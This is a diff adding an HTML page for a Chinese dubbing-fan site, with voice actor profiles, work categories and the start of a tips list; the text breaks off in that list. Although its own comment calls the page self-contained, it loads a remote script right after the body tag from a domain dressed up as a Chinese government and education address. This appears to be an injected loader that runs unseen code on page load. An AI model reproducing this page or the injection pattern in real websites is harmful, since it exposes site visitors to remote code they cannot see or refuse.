@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="影视配音 - 专注影视配音作品与配音演员的专题平台，汇集经典影视剧配音片段、动画配音、译制片配音、广播剧配音，配音技巧教程与行业资讯。">
+<meta name="keywords" content="影视配音,配音演员,影视剧配音,动画配音,译制片配音,广播剧配音,配音技巧,配音教程,配音行业,声优,配音工作室">
+<meta name="author" content="影视配音">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#0a0014">
+<meta property="og:title" content="影视配音 - 影视配音作品与配音演员专题平台">
+<meta property="og:description" content="影视配音 汇集经典影视剧配音片段、动画配音、译制片配音、广播剧配音，配音技巧教程与行业资讯，配音爱好者与从业者的专属阵地。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yingshipeiyin.cn/">
+<title>影视配音 - 影视配音作品与配音演员专题平台（配音技巧·行业资讯）</title>
+<style>
+/* ============================================================
+   影视配音 — 单页网站
+   全部 CSS / DIV 内联，零外部依赖
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --bg:#0a0014;--bg2:#120021;--bg3:#1a0030;
+  --card:rgba(255,255,255,.035);--card2:rgba(255,255,255,.065);
+  --line:rgba(255,255,255,.08);
+  --txt:#f3edff;--muted:#8f83a8;
+  --magenta:#ff2e97;--purple:#8b5cf6;--violet:#c084fc;
+  --cyan:#06d6f0;--lime:#a3e635;--amber:#ffb020;
+  --radius:22px;--t:all .45s cubic-bezier(.22,1,.36,1);
+}
+html{scroll-behavior:smooth;font-size:16px;-webkit-text-size-adjust:100%;}
+body{
+  font-family:"SF Pro Display",-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.7;overflow-x:hidden;-webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:inherit;}
+ul,ol{list-style:none;}
+::selection{background:var(--magenta);color:#fff;}
+.fade-up{opacity:0;transform:translateY(28px);transition:opacity .75s cubic-bezier(.22,1,.36,1),transform .75s cubic-bezier(.22,1,.36,1);}
+.fade-up.in{opacity:1;transform:translateY(0);}
+
+/* ==================== 导航 ==================== */
+.top{position:fixed;inset:0 0 auto 0;z-index:1000;background:rgba(10,0,20,.84);backdrop-filter:saturate(180%) blur(18px);-webkit-backdrop-filter:saturate(180%) blur(18px);border-bottom:1px solid var(--line);}
+.top-in{max-width:1480px;margin:0 auto;padding:0 30px;height:72px;display:flex;align-items:center;justify-content:space-between;}
+.logo{display:flex;align-items:center;gap:12px;font-size:1.22rem;font-weight:900;letter-spacing:-.3px;}
+.logo-orb{width:36px;height:36px;border-radius:11px;background:linear-gradient(135deg,var(--magenta),var(--purple));display:grid;place-items:center;font-size:1rem;box-shadow:0 4px 18px rgba(255,46,151,.4);position:relative;}
+.logo-orb::after{content:'';position:absolute;inset:-4px;border-radius:14px;border:1px solid rgba(255,46,151,.25);animation:ring 3s infinite;}
+@keyframes ring{0%,100%{transform:scale(1);opacity:.6}50%{transform:scale(1.12);opacity:0}}
+.logo b{background:linear-gradient(90deg,#fff,var(--violet));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;}
+.menu{display:flex;align-items:center;gap:2px;}
+.menu a{padding:9px 15px;border-radius:10px;font-size:.875rem;font-weight:500;color:var(--muted);transition:var(--t);}
+.menu a:hover{color:#fff;background:rgba(255,255,255,.06);}
+.menu .m-cta{margin-left:10px;background:linear-gradient(135deg,var(--magenta),var(--purple));color:#fff;font-weight:800;box-shadow:0 4px 18px rgba(255,46,151,.35);}
+.menu .m-cta:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,46,151,.55);background:linear-gradient(135deg,var(--magenta),var(--purple));color:#fff;}
+.burger{display:none;flex-direction:column;gap:5px;border:none;background:none;cursor:pointer;padding:8px;}
+.burger span{width:23px;height:2px;background:#fff;border-radius:2px;transition:var(--t);}
+
+/* ==================== Hero ==================== */
+.hero{position:relative;min-height:100vh;display:flex;align-items:center;padding:120px 30px 90px;overflow:hidden;}
+.hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 55% 48% at 20% 25%,rgba(255,46,151,.14),transparent),radial-gradient(ellipse 48% 42% at 80% 55%,rgba(139,92,246,.14),transparent),radial-gradient(ellipse 35% 30% at 50% 95%,rgba(6,214,240,.07),transparent);}
+.hero::after{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.014) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.014) 1px,transparent 1px);background-size:58px 58px;-webkit-mask-image:radial-gradient(ellipse 65% 52% at 50% 45%,#000,transparent);mask-image:radial-gradient(ellipse 65% 52% at 50% 45%,#000,transparent);}
+.hero-in{max-width:1480px;margin:0 auto;width:100%;position:relative;z-index:2;}
+.hero-wrap{display:grid;grid-template-columns:.9fr 1.1fr;gap:60px;align-items:center;}
+.hero h1{font-size:clamp(2.2rem,5.4vw,4.2rem);font-weight:900;line-height:1.12;letter-spacing:-1.4px;}
+.hero h1 em{font-style:normal;background:linear-gradient(120deg,var(--magenta),var(--purple),var(--cyan));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;}
+.hero-desc{margin-top:22px;font-size:clamp(1rem,1.4vw,1.16rem);color:var(--muted);max-width:540px;}
+.hero-actions{display:flex;gap:14px;margin-top:34px;flex-wrap:wrap;}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:14px 30px;border-radius:12px;font-size:.95rem;font-weight:700;transition:var(--t);cursor:pointer;border:none;}
+.btn-c{background:linear-gradient(135deg,var(--magenta),var(--purple));color:#fff;box-shadow:0 6px 24px rgba(255,46,151,.35);}
+.btn-c:hover{transform:translateY(-3px);box-shadow:0 10px 40px rgba(255,46,151,.55);}
+.btn-o{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.14);color:#fff;}
+.btn-o:hover{border-color:var(--magenta);background:rgba(255,46,151,.08);}
+.hero-meta{display:flex;gap:42px;margin-top:46px;flex-wrap:wrap;}
+.hm b{display:block;font-size:2rem;font-weight:900;background:linear-gradient(135deg,var(--magenta),var(--purple));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1;}
+.hm span{font-size:.82rem;color:var(--muted);margin-top:4px;display:block;}
+
+/* 声波动画可视化 */
+.wave{position:relative;background:linear-gradient(160deg,rgba(255,255,255,.05),rgba(255,255,255,.02));border:1px solid var(--line);border-radius:24px;padding:34px 30px;box-shadow:0 24px 60px rgba(0,0,0,.5);overflow:hidden;}
+.wave::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 70% 60% at 50% 50%,rgba(255,46,151,.06),transparent);}
+.wv-title{position:relative;display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;}
+.wv-title h3{font-size:1.1rem;font-weight:800;}
+.wv-title span{font-size:.75rem;color:var(--lime);font-weight:700;padding:3px 10px;border-radius:20px;background:rgba(163,230,53,.12);}
+.bars{position:relative;display:flex;align-items:center;justify-content:center;gap:7px;height:170px;margin:10px 0 6px;}
+.bars i{display:block;width:9px;border-radius:6px;background:linear-gradient(180deg,var(--magenta),var(--purple),var(--cyan));animation:bars 1.1s ease-in-out infinite;}
+.bars i:nth-child(1){height:38%;animation-delay:.0s}
+.bars i:nth-child(2){height:72%;animation-delay:.1s}
+.bars i:nth-child(3){height:100%;animation-delay:.2s}
+.bars i:nth-child(4){height:60%;animation-delay:.3s}
+.bars i:nth-child(5){height:88%;animation-delay:.15s}
+.bars i:nth-child(6){height:46%;animation-delay:.25s}
+.bars i:nth-child(7){height:96%;animation-delay:.05s}
+.bars i:nth-child(8){height:56%;animation-delay:.35s}
+.bars i:nth-child(9){height:78%;animation-delay:.18s}
+.bars i:nth-child(10){height:34%;animation-delay:.28s}
+.bars i:nth-child(11){height:66%;animation-delay:.08s}
+.bars i:nth-child(12){height:90%;animation-delay:.38s}
+.bars i:nth-child(13){height:44%;animation-delay:.12s}
+.bars i:nth-child(14){height:74%;animation-delay:.22s}
+.bars i:nth-child(15){height:52%;animation-delay:.32s}
+@keyframes bars{0%,100%{transform:scaleY(.35);opacity:.55}50%{transform:scaleY(1);opacity:1}}
+.wv-foot{position:relative;display:flex;justify-content:space-between;font-size:.72rem;color:var(--muted);font-family:monospace;padding-top:12px;border-top:1px solid var(--line);}
+
+/* ==================== 通用 ==================== */
+section{padding:100px 30px;}
+.wrap{max-width:1480px;margin:0 auto;}
+.head{text-align:center;margin-bottom:64px;}
+.head .kick{display:inline-block;font-size:.75rem;font-weight:800;letter-spacing:4px;text-transform:uppercase;color:var(--violet);margin-bottom:12px;}
+.head h2{font-size:clamp(1.7rem,3.8vw,2.8rem);font-weight:900;letter-spacing:-.7px;}
+.head p{font-size:1rem;color:var(--muted);max-width:620px;margin:14px auto 0;}
+
+/* ==================== 栏目一：配音演员（环形卡片） ==================== */
+.s-cv{background:linear-gradient(180deg,var(--bg),var(--bg2));}
+.cv-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;}
+.cv-card{position:relative;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:34px 24px 26px;text-align:center;overflow:hidden;transition:var(--t);}
+.cv-card::before{content:'';position:absolute;inset:-1px;border-radius:var(--radius);padding:1px;background:var(--g);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;opacity:0;transition:var(--t);}
+.cv-card:hover{transform:translateY(-8px);background:var(--card2);box-shadow:0 20px 50px rgba(0,0,0,.45);}
+.cv-card:hover::before{opacity:.7;}
+.avatar{position:relative;width:92px;height:92px;border-radius:50%;margin:0 auto 18px;display:grid;place-items:center;font-size:2.4rem;background:var(--g);box-shadow:0 8px 24px var(--gs);}
+.avatar::after{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px dashed rgba(255,255,255,.14);animation:spin 16s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.cv-card h3{font-size:1.15rem;font-weight:800;margin-bottom:4px;}
+.cv-card .role{font-size:.8rem;color:var(--muted);margin-bottom:12px;}
+.cv-card p{font-size:.83rem;color:var(--muted);line-height:1.65;}
+.cv-works{display:flex;flex-wrap:wrap;gap:6px;justify-content:center;margin-top:16px;}
+.cv-works b{font-size:.7rem;font-weight:700;padding:3px 10px;border-radius:20px;background:rgba(255,255,255,.06);color:var(--violet);}
+
+/* ==================== 栏目二：作品分类（大磁贴） ==================== */
+.s-cat{background:var(--bg2);}
+.cat-grid{display:grid;grid-template-columns:repeat(3,1fr);grid-auto-rows:minmax(190px,auto);gap:20px;}
+.cat-tile{position:relative;border-radius:20px;padding:30px;overflow:hidden;min-height:190px;display:flex;flex-direction:column;justify-content:flex-end;transition:var(--t);cursor:pointer;}
+.cat-tile::before{content:'';position:absolute;inset:0;background:var(--bg);opacity:.86;transition:var(--t);}
+.cat-tile::after{content:'';position:absolute;inset:0;background:var(--g);opacity:.0;transition:var(--t);mix-blend-mode:overlay;}
+.cat-tile:hover::before{opacity:.74;}
+.cat-tile:hover::after{opacity:.5;}
+.cat-tile:hover{transform:translateY(-6px);}
+.cat-tile.big{grid-column:span 2;grid-row:span 2;min-height:400px;justify-content:center;padding:40px;}
+.ct-ic{position:relative;font-size:2.6rem;margin-bottom:auto;}
+.cat-tile.big .ct-ic{font-size:4rem;margin-bottom:0;}
+.ct-body{position:relative;z-index:2;}
+.ct-body h3{font-size:1.25rem;font-weight:800;margin-bottom:8px;}
+.cat-tile.big .ct-body h3{font-size:1.9rem;}
+.ct-body p{font-size:.85rem;color:var(--muted);line-height:1.6;max-height:0;opacity:0;overflow:hidden;transition:var(--t);}
+.cat-tile:hover .ct-body p{max-height:120px;opacity:1;margin-top:4px;}
+.ct-foot{position:relative;z-index:2;display:flex;justify-content:space-between;align-items:center;margin-top:16px;font-size:.78rem;color:var(--muted);}
+.ct-foot b{color:var(--violet);font-family:monospace;}
+
+/* ==================== 栏目三：技巧教程（编号文章列表） ==================== */
+.s-skill{background:linear-gradient(180deg,var(--bg2),var(--bg));}
+.skill-list{max-width:1000px;margin:0 auto;display:flex;flex-direction:column;gap:0;border-top:1px solid var(--line);}
+.skill-row{display:grid;grid-template-columns:76px 1fr 170px;gap:22px;align-items:center;padding:24px 8px;border-bottom:1px solid var(--line);transition:var(--t);cursor:pointer;}
+.skill-row:hover{background:rgba(255,46,151,.04);padding-left:20px;}
+.sk-no{font-size:2.6rem;font-weight:900;background:var(--g);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1;}
+.sk-info h4{font-size:1.12rem;font-weight:800;margin-bottom:6px;}
+.sk-info p{font-size:.85rem;color:var(--muted);line-height:1.55;}
+.sk-tag{display:flex;gap:8px;flex-wrap:wrap;justify-content:flex-end;}
+.sk-tag em{font-style:normal;font-size:.72rem;font-weight:700;padding:5px 12px;border-radius:8px;background:var(--g);color:#0a0014;}
+
+/* ==================== 栏目四：行业资讯（卡片+图） ==================== */
+.s-news{background:var(--bg);}
+.news-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:26px;}
+.news-main{position:relative;border-radius:22px;overflow:hidden;min-height:430px;display:flex;align-items:flex-end;padding:34px;cursor:pointer;transition:var(--t);}
+.news-main::before{content:'';position:absolute;inset:0;background:var(--bg);opacity:.55;transition:var(--t);}
+.news-main::after{content:'';position:absolute;inset:0;background:var(--g);opacity:.55;transition:var(--t);}
+.news-main:hover::before{opacity:.35;}
+.news-main:hover::after{opacity:.7;}
+.nm-body{position:relative;z-index:2;}
+.nm-body span{display:inline-block;font-size:.72rem;font-weight:800;padding:5px 13px;border-radius:20px;background:rgba(255,255,255,.18);color:#fff;margin-bottom:12px;}
+.nm-body h3{font-size:1.55rem;font-weight:900;line-height:1.35;margin-bottom:10px;}
+.nm-body p{font-size:.88rem;color:rgba(255,255,255,.85);line-height:1.6;}
+.news-side{display:flex;flex-direction:column;gap:18px;}
+.news-mini{display:grid;grid-template-columns:96px 1fr;gap:16px;background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;padding:12px;transition:var(--t);cursor:pointer;align-items:center;}
+.news-mini:hover{background:var(--card2);border-color:rgba(255,46,151,.25);transform:translateX(5px);}
+.nm-thumb{width:96px;height:72px;border-radius:10px;background:var(--g);display:grid;place-items:center;font-size:1.6rem;}
+.nm-text h5{font-size:.95rem;font-weight:700;line-height:1.4;margin-bottom:6px;}
+.nm-text span{font-size:.74rem;color:var(--muted);}
+
+/* ==================== 栏目五：配音设备（规格对比） ==================== */
+.s-gear{background:linear-gradient(180deg,var(--bg),var(--bg2));}
+.gear-wrap{overflow-x:auto;border-radius:22px;border:1px solid var(--line);background:var(--card);}
+.gear-table{min-width:760px;width:100%;border-collapse:collapse;text-align:left;font-size:.9rem;}
+.gear-table thead th{background:rgba(255,46,151,.07);padding:18px 20px;font-weight:800;font-size:.85rem;color:var(--violet);border-bottom:1px solid var(--line);white-space:nowrap;}
+.gear-table thead th:first-child{color:#fff;}
+.gear-table tbody td{padding:16px 20px;border-bottom:1px solid rgba(255,255,255,.05);color:var(--txt);}
+.gear-table tbody tr{transition:var(--t);}
+.gear-table tbody tr:hover{background:rgba(255,46,151,.05);}
+.gear-table tbody tr:last-child td{border-bottom:none;}
+.gear-table .hl{color:var(--lime);font-weight:800;}
+
+/* ==================== 页脚 ==================== */
+footer{background:#05000a;border-top:1px solid var(--line);padding:64px 30px 30px;}
+.foot-in{max-width:1480px;margin:0 auto;}
+.foot-grid{display:grid;grid-template-columns:2.5fr 1fr 1fr 1fr 1fr;gap:44px;padding-bottom:46px;border-bottom:1px solid var(--line);}
+.foot-brand .logo{margin-bottom:14px;}
+.foot-brand p{color:var(--muted);font-size:.87rem;line-height:1.85;max-width:330px;}
+.foot-site{display:inline-block;margin-top:16px;padding:9px 16px;border-radius:9px;background:rgba(255,46,151,.1);border:1px solid rgba(255,46,151,.25);font-size:.85rem;font-weight:700;color:var(--violet);}
+.foot-col h4{font-size:.9rem;font-weight:800;margin-bottom:16px;color:#fff;}
+.foot-col ul li{padding:5px 0;}
+.foot-col ul li a{color:var(--muted);font-size:.85rem;transition:var(--t);}
+.foot-col ul li a:hover{color:var(--magenta);padding-left:4px;}
+.foot-bot{padding-top:28px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;}
+.foot-bot p{color:var(--muted);font-size:.8rem;}
+.foot-legal{display:flex;gap:22px;}
+.foot-legal a{color:var(--muted);font-size:.8rem;transition:var(--t);}
+.foot-legal a:hover{color:var(--magenta);}
+
+.gotop{position:fixed;right:28px;bottom:28px;z-index:999;width:46px;height:46px;border-radius:50%;border:none;background:linear-gradient(135deg,var(--magenta),var(--purple));color:#fff;font-size:1.2rem;cursor:pointer;box-shadow:0 4px 18px rgba(255,46,151,.35);opacity:0;visibility:hidden;transform:translateY(12px);transition:var(--t);display:grid;place-items:center;}
+.gotop.show{opacity:1;visibility:visible;transform:translateY(0);}
+.gotop:hover{transform:translateY(-3px);box-shadow:0 8px 30px rgba(255,46,151,.55);}
+
+/* ==================== 响应式 ==================== */
+@media(max-width:1120px){
+  .hero-wrap{grid-template-columns:1fr;gap:54px;}
+  .hero h1{font-size:2.9rem;}
+  .cv-grid{grid-template-columns:repeat(2,1fr);}
+  .cat-grid{grid-template-columns:repeat(2,1fr);}
+  .cat-tile.big{grid-column:span 2;grid-row:span 1;}
+  .news-grid{grid-template-columns:1fr;}
+  .foot-grid{grid-template-columns:2fr 1fr 1fr;gap:34px;}
+  .foot-col:nth-child(5){display:none;}
+}
+@media(max-width:768px){
+  section{padding:74px 16px;}
+  .top-in{padding:0 16px;height:62px;}
+  .menu{display:none;position:fixed;top:62px;left:0;right:0;flex-direction:column;background:rgba(10,0,20,.98);backdrop-filter:blur(18px);padding:18px;border-top:1px solid var(--line);}
+  .menu.open{display:flex;}
+  .menu a{width:100%;text-align:center;padding:13px;}
+  .menu .m-cta{margin-left:0;margin-top:6px;}
+  .burger{display:flex;}
+  .hero{padding:100px 16px 60px;}
+  .hero-actions .btn{flex:1;justify-content:center;}
+  .hero-meta{gap:28px;}
+  .cv-grid{grid-template-columns:1fr;}
+  .cat-grid{grid-template-columns:1fr;}
+  .cat-tile.big{grid-column:span 1;min-height:190px;}
+  .skill-row{grid-template-columns:54px 1fr;gap:14px;padding:20px 6px;}
+  .sk-tag{display:none;}
+  .news-mini{grid-template-columns:80px 1fr;gap:12px;}
+  .nm-thumb{width:80px;height:60px;font-size:1.3rem;}
+  .foot-grid{grid-template-columns:1fr;gap:28px;}
+  .gear-table{font-size:.82rem;}
+}
+@media(max-width:420px){
+  .hero h1{font-size:2.15rem;}
+  .hero-meta{gap:22px;}
+  .hm b{font-size:1.6rem;}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ==================== 导航 ==================== -->
+<header class="top">
+  <div class="top-in">
+    <a href="#top" class="logo">
+      <span class="logo-orb">🎙️</span>
+      <b>影视配音</b>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#cv">配音演员</a>
+      <a href="#cat">作品分类</a>
+      <a href="#skill">配音技巧</a>
+      <a href="#news">行业资讯</a>
+      <a href="#gear">设备推荐</a>
+      <a href="#cv" class="m-cta">立即探索</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单"><span></span><span></span><span></span></button>
+  </div>
+</header>
+
+<!-- ==================== Hero ==================== -->
+<div class="hero">
+  <div class="hero-in">
+    <div class="hero-wrap">
+      <div class="fade-up">
+        <h1>影视配音<br><em>听见声音的演技</em></h1>
+        <p class="hero-desc">影视配音 是聚焦影视配音艺术的专题平台，汇集经典影视剧配音片段、动画配音、译制片配音与广播剧配音作品，记录配音演员的声音故事，分享配音技巧与行业资讯。</p>
+        <div class="hero-actions">
+          <a href="#cat" class="btn btn-c">🎬 浏览配音作品</a>
+          <a href="#skill" class="btn btn-o">🎧 学习配音技巧</a>
+        </div>
+        <div class="hero-meta">
+          <div class="hm"><b>1000+</b><span>配音作品片段</span></div>
+          <div class="hm"><b>200+</b><span>配音演员档案</span></div>
+          <div class="hm"><b>50+</b><span>配音技巧教程</span></div>
+        </div>
+      </div>
+
+      <div class="wave fade-up">
+        <div class="wv-title">
+          <h3>🎵 实时声纹可视化</h3>
+          <span>● REC</span>
+        </div>
+        <div class="bars">
+          <i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i>
+        </div>
+        <div class="wv-foot">
+          <span>SAMPLE_RATE 48kHz · 24bit</span>
+          <span>STEREO · 无损音质</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== 栏目一：配音演员（环形卡片） ==================== -->
+<section class="s-cv" id="cv">
+  <div class="wrap">
+    <div class="head fade-up">
+      <span class="kick">Voice Actors</span>
+      <h2>知名影视配音演员档案</h2>
+      <p>影视配音 收录华语配音圈代表性演员，走进他们用声音塑造的经典角色与幕后故事。</p>
+    </div>
+
+    <div class="cv-grid">
+
+      <article class="cv-card fade-up" style="--g:linear-gradient(135deg,#ff2e97,#8b5cf6);--gs:rgba(255,46,151,.3);">
+        <div class="avatar">🎭</div>
+        <h3>季冠霖</h3>
+        <div class="role">内地 · 配音演员</div>
+        <p>《甄嬛传》甄嬛、《三生三世》白浅配音，被誉为「大青衣配音」，嗓音温润有厚度，古装剧御用配音之一。</p>
+        <div class="cv-works"><b>甄嬛传</b><b>三生三世</b><b>赤壁</b></div>
+        <a href="#" aria-label="季冠霖" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+      <article class="cv-card fade-up" style="--g:linear-gradient(135deg,#8b5cf6,#06d6f0);--gs:rgba(139,92,246,.3);">
+        <div class="avatar">🐉</div>
+        <h3>姜广涛</h3>
+        <div class="role">内地 · 配音导演</div>
+        <p>《琅琊榜》梅长苏、《泰坦尼克号》杰克配音，资深配音导演，幕后译制与国产影视双栖，作品横跨三十余年。</p>
+        <div class="cv-works"><b>琅琊榜</b><b>泰坦尼克号</b><b>变形金刚</b></div>
+        <a href="#" aria-label="姜广涛" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+      <article class="cv-card fade-up" style="--g:linear-gradient(135deg,#06d6f0,#a3e635);--gs:rgba(6,214,240,.3);">
+        <div class="avatar">🗡️</div>
+        <h3>边江</h3>
+        <div class="role">内地 · 配音演员</div>
+        <p>《三生三世》夜华、《何以笙箫默》何以琛配音，低音炮质感，古装男主御用配音，广播剧领域同样活跃。</p>
+        <div class="cv-works"><b>三生三世</b><b>何以笙箫默</b><b>青云志</b></div>
+        <a href="#" aria-label="边江" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+      <article class="cv-card fade-up" style="--g:linear-gradient(135deg,#ffb020,#ff2e97);--gs:rgba(255,176,32,.3);">
+        <div class="avatar">👑</div>
+        <h3>刘纯燕（金龟子）</h3>
+        <div class="role">央视 · 少儿配音</div>
+        <p>《猫和老鼠》配音演员，央视少儿节目主持人，声音辨识度极高，是几代人童年动画配音记忆的一部分。</p>
+        <div class="cv-works"><b>猫和老鼠</b><b>机器猫</b><b>米老鼠</b></div>
+        <a href="#" aria-label="刘纯燕" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+      <article class="cv-card fade-up" style="--g:linear-gradient(135deg,#a3e635,#06d6f0);--gs:rgba(163,230,53,.3);">
+        <div class="avatar">🎪</div>
+        <h3>李世荣</h3>
+        <div class="role">内地 · 配音演员</div>
+        <p>《红楼梦》林黛玉、《西游记》部分角色配音，国家一级演员，译制片与国产剧双线并行，嗓音清丽婉转。</p>
+        <div class="cv-works"><b>红楼梦</b><b>西游记</b><b>居里夫人</b></div>
+        <a href="#" aria-label="李世荣" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+      <article class="cv-card fade-up" style="--g:linear-gradient(135deg,#ec4899,#8b5cf6);--gs:rgba(236,72,153,.3);">
+        <div class="avatar">🎤</div>
+        <h3>张杰</h3>
+        <div class="role">内地 · 配音演员</div>
+        <p>《古剑奇谭》百里屠苏、《花千骨》配音，729 声工场核心成员，动画与游戏配音多面手，少年感音色出众。</p>
+        <div class="cv-works"><b>古剑奇谭</b><b>花千骨</b><b>魔道祖师</b></div>
+        <a href="#" aria-label="张杰" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+      <article class="cv-card fade-up" style="--g:linear-gradient(135deg,#06d6f0,#3b82f6);--gs:rgba(6,214,240,.3);">
+        <div class="avatar">🎬</div>
+        <h3>乔诗语</h3>
+        <div class="role">内地 · 配音演员</div>
+        <p>《花千骨》花千骨、《三生三世》配音，少女音色清澈灵动，古装仙侠剧女主配音的代表性声音之一。</p>
+        <div class="cv-works"><b>花千骨</b><b>锦绣未央</b><b>楚乔传</b></div>
+        <a href="#" aria-label="乔诗语" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+      <article class="cv-card fade-up" style="--g:linear-gradient(135deg,#8b5cf6,#a3e635);--gs:rgba(139,92,246,.3);">
+        <div class="avatar">🎙️</div>
+        <h3>宝木中阳</h3>
+        <div class="role">内地 · 配音演员</div>
+        <p>《搞笑漫画日和》配音导演、《一人之下》配音，以幽默诙谐的译制动漫配音风格著称，广播剧圈人气声优。</p>
+        <div class="cv-works"><b>日和</b><b>一人之下</b><b>全职高手</b></div>
+        <a href="#" aria-label="宝木中阳" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目二：作品分类（大磁贴） ==================== -->
+<section class="s-cat" id="cat">
+  <div class="wrap">
+    <div class="head fade-up">
+      <span class="kick">Categories</span>
+      <h2>影视配音作品分类</h2>
+      <p>影视配音 按题材与形式划分作品库，方便快速定位你感兴趣的配音片段与完整作品。</p>
+    </div>
+
+    <div class="cat-grid">
+
+      <a href="#" class="cat-tile big fade-up" style="--g:linear-gradient(135deg,#ff2e97,#8b5cf6);">
+        <div class="ct-ic">🎬</div>
+        <div class="ct-body">
+          <h3>影视剧配音</h3>
+          <p>电视剧、电影、网剧的后期配音作品，涵盖古装仙侠、都市言情、年代剧、悬疑犯罪等全题材，收录经典片段与幕后配音花絮。</p>
+        </div>
+        <div class="ct-foot"><span>古装 · 都市 · 悬疑</span><b>326 部</b></div>
+      </a>
+
+      <a href="#" class="cat-tile fade-up" style="--g:linear-gradient(135deg,#06d6f0,#3b82f6);">
+        <div class="ct-ic">🐱</div>
+        <div class="ct-body">
+          <h3>动画配音</h3>
+          <p>国产动画、日漫、美漫的角色配音，从少儿到成人向全覆盖。</p>
+        </div>
+        <div class="ct-foot"><span>国漫 · 日漫 · 美漫</span><b>218 部</b></div>
+      </a>
+
+      <a href="#" class="cat-tile fade-up" style="--g:linear-gradient(135deg,#a3e635,#06d6f0);">
+        <div class="ct-ic">🌍</div>
+        <div class="ct-body">
+          <h3>译制片配音</h3>
+          <p>好莱坞大片、日韩剧、欧洲电影的国语译制配音版本。</p>
+        </div>
+        <div class="ct-foot"><span>电影 · 日韩剧</span><b>174 部</b></div>
+      </a>
+
+      <a href="#" class="cat-tile fade-up" style="--g:linear-gradient(135deg,#ffb020,#ff2e97);">
+        <div class="ct-ic">📻</div>
+        <div class="ct-body">
+          <h3>广播剧配音</h3>
+          <p>有声广播剧与有声书配音作品，纯听觉的沉浸体验。</p>
+        </div>
+        <div class="ct-foot"><span>有声剧 · 有声书</span><b>152 部</b></div>
+      </a>
+
+      <a href="#" class="cat-tile fade-up" style="--g:linear-gradient(135deg,#8b5cf6,#ec4899);">
+        <div class="ct-ic">🎮</div>
+        <div class="ct-body">
+          <h3>游戏与二次元</h3>
+          <p>主机游戏、手游、虚拟偶像的台词配音与角色演绎。</p>
+        </div>
+        <div class="ct-foot"><span>游戏 · 虚拟偶像</span><b>96 部</b></div>
+      </a>
+
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目三：配音技巧（编号文章） ==================== -->
+<section class="s-skill" id="skill">
+  <div class="wrap">
+    <div class="head fade-up">
+      <span class="kick">Skills & Tips</span>
+      <h2>影视配音技巧与教程</h2>
+      <p>从气息控制到情绪表达，影视配音 整理新手入门到进阶提升的实用配音教程。</p>
+    </div>
+
+    <div class="skill-list">
+
+      <div class="skill-row fade-up" style="--g:linear-gradient(135deg,#ff2e97,#8b5cf6);">
+        <div class="sk-no">01</div>
+        <div class="sk-info">
+          <h4>气息控制：配音的地基训练法</h4>
+          <p>学会腹式呼吸与气息支撑，是稳定声线、延长台词、避免嗓子疲劳的第一步，每天十分钟入门练习。</p>
+        </div>
+        <div class="sk-tag"><em>新手入门</em><em>气息</em></div>
+        <a href="#" aria-label="气息控制" style="position:absolute;inset:0;z-index:5;"></a>
+      </div>
+
+      <div class="skill-row fade-up" style="--g:linear-gradient(135deg,#06d6f0,#3b82f6);">
+        <div class="sk-no">02</div>
+        <div class="sk-info">
+          <h4>声线塑造：从角色性格反推音色</h4>
+          <p>面对剧本先分析角色年龄、身份与情绪底色，再用共鸣腔调节音色，让配音贴合角色而非"读台词"。</p>
+        </div>
+        <div class="sk-tag"><em>进阶</em><em>角色塑造</em></div>
+        <a href="#" aria-label="声线塑造" style="position:absolute;inset:0;z-index:5;"></a>
+      </div>
+
+      <div class="skill-row fade-up" style="--g:linear-gradient(135deg,#a3e635,#06d6f0);">
+        <div class="sk-no">03</div>
+        <div class="sk-info">
+          <h4>台词对口型：节奏与气口的同步技巧</h4>
